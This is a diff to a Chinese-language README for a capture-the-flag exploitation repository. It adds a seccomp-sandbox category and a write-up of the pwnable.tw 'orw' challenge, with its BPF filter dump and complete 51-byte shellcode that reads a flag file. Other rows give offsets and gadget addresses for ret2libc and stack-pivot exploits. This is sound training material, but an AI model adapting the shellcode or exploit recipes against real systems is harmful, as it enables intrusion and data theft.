@@ -7,7 +7,7 @@
 
 ## 1. 分类原则
 
-本仓库目前按九类利用原语（exploit primitive）划分：
+本仓库目前按十类利用原语（exploit primitive）划分：
 
 | 模式目录 | 共同模式特征 | 判定核心 |
 | --- | --- | --- |
@@ -16,6 +16,7 @@
 | `ret2libc` | 栈溢出 + leak libc | 覆盖 saved RIP，先 leak libc 地址，再返回 libc 的 `system("/bin/sh")` |
 | `ret2shellcode` | 可执行内存 + shellcode | NX 关闭（`GNU_STACK=RWE`），leak 可执行内存地址后把 shellcode 写进去并跳转 |
 | `stack_pivot` | 栈空间不足 → 换栈 | 溢出字节数装不下 ROP 链，用 `xchg rsp,rax` / `leave;ret` 把栈迁到堆 / `.bss` / mmap 再执行长链 |
+| `sandbox_seccomp` | seccomp 沙箱 + ORW | 程序用 `prctl` 装 BPF 过滤，`execve` 被拦；只能 `open`+`read`+`write` 把 flag 读出来 |
 | `format_string_write` | 格式化字符串任意写 | `printf(user_input)`，用 `%n` 改全局变量 / GOT / 返回地址 |
 | `stack_local_var_overwrite` | 栈溢出改局部变量 / 条件绕过 | 只覆盖与缓冲区相邻的局部变量，使条件判断成立，不控制 RIP |
 | `heap_uaf` | 释放后使用 | free 后指针仍被引用，重新分配旧对象，改写函数指针 / vtable / 控制流 |
@@ -24,6 +25,8 @@
 判定顺序：
 
 ```text
+0. 是否装了 seccomp 沙箱（`prctl(PR_SET_SECCOMP)` + `.rodata` 里的 BPF 数组）？
+   └─ 是 → 目标改成 ORW；落地方式继续按 3~6 判断（shellcode / ROP / pivot）
 1. 有没有可控输入 / 内存破坏点？
    └─ 没有，且程序直接给 shell → network_interaction_free_shell
 2. 输入是否被直接传给 printf？
@@ -39,6 +42,9 @@
    ├─ free 后指针仍被引用，可重占旧对象 → heap_uaf
    └─ 需要操纵堆布局 / 分配器元数据 / 相邻对象指针 → heap_exploitation
 ```
+
+> 第 0 条是"横切关注点"：seccomp 不改变落地原语，只把最终目标从 `getshell`
+> 换成 `open/read/write`（`sandbox_seccomp`）。
 
 ---
 
@@ -68,6 +74,7 @@
 | 20 | `bbbaby_pwn1` | 任意写 + canary 绕过 + ret2libc / 64 位 | `ret2libc` | 8 字节任意写把 `__stack_chk_fail@got` 改成 `leave;ret`，canary 失败反而成为栈迁移入口；CSU ROP leak libc 后把 `atoi@got` 改成 `system` | **0x110**（canary 0x108） | `leave;ret=0x40086a`、`csu_pop=0x4009fa`、`csu_call=0x4009e0`、`__stack_chk_fail@got=0x601020`、`atoi@got=0x601040` |
 | 21 | `pwnable_start` | ret2shellcode / 栈可执行 / 32 位静态汇编 | `ret2shellcode` | `read(0, esp, 0x3c)` 一次溢出即可覆盖返回地址，且 `push esp` 让栈地址天然泄漏；`GNU_STACK=RWE` 直接执行栈上 `execve("/bin/sh")` | **0x14**（shellcode 在 0x18） | `leak=0x8048087`、payload 基址 `leak-4`、shellcode 21 字节 |
 | 22 | `ropemporium_pivot` | stack pivot + 两阶段 .so leak / 64 位 | `stack_pivot` | `read(0, rbp-0x20, 0x40)` 只给 0x18 可用字节 → `pop rax`+`xchg rsp,rax` 迁到程序打印的 `heap+0xFFFF00`；CSU 链先调 `[foothold@got]` 触发懒绑定再 `puts` 泄漏 libpivot 基址，回 main 二次迁移打 `ret2win` | **0x28**（仅 0x40 上限） | `pop rax=0x4009bb`、`xchg rsp,rax=0x4009bd`、CSU `0x400a2a`/`0x400a10`、`foothold=0x96a`、`ret2win=0xa81` |
+| 23 | `pwnable_orw` | seccomp 沙箱 + ORW shellcode / 32 位 | `sandbox_seccomp` | `read(0, 0x804a060, 0xc8)` 后直接 `call` 缓冲区；BPF 只放行 `open/read/write/exit`，写 51 字节 ORW shellcode 读 `flag.txt` | N/A（无栈溢出） | shellcode 落点 `0x804a060`、上限 `0xc8`、BPF 表 `0x8048640` |
 
 ---
 
@@ -627,6 +634,65 @@ pwnme @0x4008f1:
 
 ---
 
+### 3.23 `23_pwnable_orw` → `sandbox_seccomp`
+
+```text
+32 位 i386、No PIE（EXEC）、GNU_STACK=RWE、有 canary、partial RELRO、not stripped
+```
+
+`main`：
+
+```text
+main @0x8048548:
+  orw_seccomp()                          # prctl(PR_SET_NO_NEW_PRIVS) + prctl(PR_SET_SECCOMP, FILTER)
+  printf("Give my your shellcode:")
+  read(0, 0x804a060, 0xc8)               # 200 字节 shellcode -> .bss
+  call 0x804a060                         # 直接执行
+```
+
+BPF（`0x8048640`，12 条，每条 `code/jt/jf/k`）：
+
+```text
+ 0: ld  [4] arch          1: jeq 0x40000003 (非 i386 -> ALLOW)
+ 2: ld  [0] nr
+ 3: jeq 173 (rt_sigreturn)  jt=7 -> ALLOW
+ 4: jeq 119 (sigreturn)     jt=6 -> ALLOW
+ 5: jeq 252 (exit_group)    jt=5 -> ALLOW
+ 6: jeq   1 (exit)          jt=4 -> ALLOW
+ 7: jeq   5 (open)          jt=3 -> ALLOW
+ 8: jeq   3 (read)          jt=2 -> ALLOW
+ 9: jeq   4 (write)         jt=1 -> ALLOW
+10: ret 0x50026             # SECCOMP_RET_ERRNO, ENOSYS
+11: ret 0x7fff0000          # SECCOMP_RET_ALLOW
+```
+
+判定依据：
+
+1. `prctl` 两次 + `.rodata` 里的 BPF 数组 → 命中 §1 判定顺序第 0 条 `sandbox_seccomp`。
+2. 能落地的原语是"直接 `call` 输入缓冲区" → 属于 shellcode 路线，但 `execve` 被拦，
+   目标改成 ORW。
+3. canary / RELRO 与本题无关（没有栈溢出）。
+
+已知环境差异（重要）：
+
+- `0x804a060` 位于第二个 `PT_LOAD`（`p_vaddr=0x8049f08`，`p_flags=RW`）。
+  2.6.32 老内核上 RW 段实际可执行，原题可解；现代内核严格 NX，本地执行
+  `call 0x804a060` 会 `SIGSEGV`（实测 `exit=-11`，`write` 一个字节都没有）。
+- 归档里提供 `make_local_exec.py`：只把该 PT_LOAD 的 `p_flags` 改成 `RWE`，
+  生成 `orw_local_exec` 供本地验证；原版 `orw` 不动，远程分支仍用原版。
+
+shellcode（51 字节，缓冲区用栈）：
+
+```asm
+xor eax,eax; push eax; push 0x7478742e; push 0x67616c66   ; "flag.txt"
+mov ebx,esp; xor ecx,ecx; mov al,5; int 0x80               ; open
+mov ebx,eax; sub esp,0x100; mov ecx,esp
+xor eax,eax; mov al,3; mov edx,0x100; int 0x80             ; read
+xor eax,eax; xor ebx,ebx; inc ebx; mov al,4; int 0x80      ; write(1,...)
+```
+
+---
+
 ## 4. 仓库结构映射（重构前 → 重构后）
 
 | 重构前（按题目建目录） | 重构后（按模式归档） |
@@ -653,6 +719,7 @@ pwnme @0x4008f1:
 | `[陇原战"疫"2021网络安全大赛]bbbaby/pwn1`（根目录散落） | `ret2libc/20_bbbaby_pwn1_*`、`ret2libc/bbbaby_pwn1`、`ret2libc/libc-2.23.so` |
 | pwnable.tw `start`（外部下载，`_vendor/start`） | `ret2shellcode/21_pwnable_start_*`、`ret2shellcode/pwnable_start` |
 | ROP Emporium `pivot`（外部下载，`_vendor/pivot/`） | `stack_pivot/22_ropemporium_pivot_*`、`stack_pivot/pivot`、`stack_pivot/libpivot.so` |
+| pwnable.tw `orw`（外部下载，`_vendor/orw`） | `sandbox_seccomp/23_pwnable_orw_*`、`sandbox_seccomp/orw`、`sandbox_seccomp/make_local_exec.py` |
 
 命名规则：
 
